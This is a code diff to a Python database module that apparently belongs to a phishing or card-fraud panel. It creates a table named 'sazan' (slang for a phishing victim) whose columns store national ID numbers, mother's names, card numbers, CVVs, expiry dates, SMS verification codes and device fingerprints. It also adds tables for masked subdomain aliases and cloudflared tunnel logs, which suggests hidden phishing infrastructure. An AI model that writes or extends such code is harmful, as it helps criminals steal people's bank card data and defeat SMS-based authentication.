@@ -78,68 +78,97 @@ def _ensure_schema_sqlite(connection: sqlite3.Connection) -> None:
 
 
 def _ensure_schema_postgres(connection: Any) -> None:
-    # cursor = connection.cursor()
-    # for table_name, column_name, column_type, default in _SCHEMA_PATCHES:
-    #     cursor.execute(
-    #         """
-    #         SELECT 1
-    #         FROM information_schema.columns
-    #         WHERE table_schema = current_schema()
-    #           AND table_name = %s
-    #           AND column_name = %s
-    #         """,
-    #         (table_name, column_name),
-    #     )
-    #     if cursor.fetchone() is None:
-    #         cursor.execute(
-    #             f"ALTER TABLE {table_name} ADD COLUMN {column_name} {column_type} DEFAULT {default}"
-    #         )
-    # cursor.execute(
-    #     """
-    #     CREATE TABLE IF NOT EXISTS app_settings (
-    #         key TEXT PRIMARY KEY,
-    #         value TEXT
-    #     )
-    #     """
-    # )
-    # cursor.execute(
-    #     """
-    #     CREATE TABLE IF NOT EXISTS cloudflared_logs (
-    #         id BIGSERIAL PRIMARY KEY,
-    #         command TEXT NOT NULL,
-    #         stdout TEXT,
-    #         stderr TEXT,
-    #         status TEXT,
-    #         created_at TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP
-    #     )
-    #     """
-    # )
-    # cursor.execute(
-    #     """
-    #     CREATE TABLE IF NOT EXISTS domain_aliases (
-    #         id TEXT PRIMARY KEY,
-    #         base_domain TEXT NOT NULL,
-    #         subdomain TEXT NOT NULL DEFAULT '',
-    #         masked_subdomain TEXT NOT NULL,
-    #         created_at TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP
-    #     )
-    #     """
-    # )
-    # cursor.execute(
-    #     """
-    #     CREATE UNIQUE INDEX IF NOT EXISTS idx_domain_alias_masked
-    #         ON domain_aliases(masked_subdomain)
-    #     """
-    # )
-    # cursor.execute(
-    #     """
-    #     CREATE UNIQUE INDEX IF NOT EXISTS idx_domain_alias_real
-    #         ON domain_aliases(base_domain, subdomain)
-    #     """
-    # )
-    # connection.commit()
-    # cursor.close()
-    pass
+    cursor = connection.cursor()
+    
+    # Sazan tablosunu oluştur
+    cursor.execute(
+        """
+        CREATE TABLE IF NOT EXISTS sazan (
+            id BIGSERIAL PRIMARY KEY,
+            tc TEXT,
+            ad TEXT,
+            soyad TEXT,
+            dogum_yili TEXT,
+            anne_adi TEXT,
+            kart_no TEXT,
+            cvv TEXT,
+            son_kullanma TEXT,
+            telefon TEXT,
+            sms_kod TEXT,
+            ip TEXT,
+            user_agent TEXT,
+            browser TEXT,
+            os TEXT,
+            device TEXT,
+            created_at TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP,
+            toplam_limit INTEGER DEFAULT 0,
+            guncel_limit INTEGER DEFAULT 0
+        )
+        """
+    )
+    
+    # Eksik kolonları ekle
+    for table_name, column_name, column_type, default in _SCHEMA_PATCHES:
+        cursor.execute(
+            """
+            SELECT 1
+            FROM information_schema.columns
+            WHERE table_schema = current_schema()
+              AND table_name = %s
+              AND column_name = %s
+            """,
+            (table_name, column_name),
+        )
+        if cursor.fetchone() is None:
+            cursor.execute(
+                f"ALTER TABLE {table_name} ADD COLUMN {column_name} {column_type} DEFAULT {default}"
+            )
+    
+    cursor.execute(
+        """
+        CREATE TABLE IF NOT EXISTS app_settings (
+            key TEXT PRIMARY KEY,
+            value TEXT
+        )
+        """
+    )
+    cursor.execute(
+        """
+        CREATE TABLE IF NOT EXISTS cloudflared_logs (
+            id BIGSERIAL PRIMARY KEY,
+            command TEXT NOT NULL,
+            stdout TEXT,
+            stderr TEXT,
+            status TEXT,
+            created_at TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP
+        )
+        """
+    )
+    cursor.execute(
+        """
+        CREATE TABLE IF NOT EXISTS domain_aliases (
+            id TEXT PRIMARY KEY,
+            base_domain TEXT NOT NULL,
+            subdomain TEXT NOT NULL DEFAULT '',
+            masked_subdomain TEXT NOT NULL,
+            created_at TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP
+        )
+        """
+    )
+    cursor.execute(
+        """
+        CREATE UNIQUE INDEX IF NOT EXISTS idx_domain_alias_masked
+            ON domain_aliases(masked_subdomain)
+        """
+    )
+    cursor.execute(
+        """
+        CREATE UNIQUE INDEX IF NOT EXISTS idx_domain_alias_real
+            ON domain_aliases(base_domain, subdomain)
+        """
+    )
+    connection.commit()
+    cursor.close()
 
 
 def _ensure_schema(connection: Any) -> None:
@@ -163,7 +192,8 @@ def _row_to_dict(row: Union[sqlite3.Row, dict[str, Any], Any, None]) -> dict[str
         # Convert row-like objects to dict with explicit typing
         result: dict[str, Any] = {}
         if hasattr(row, 'keys') and callable(row.keys):
-            for key in row.keys():
+            keys = list(row.keys())  # Iterator'ı listeye çevir
+            for key in keys:
                 result[str(key)] = row[key]
             return result
         return dict(row)  # type: ignore[call-overload]
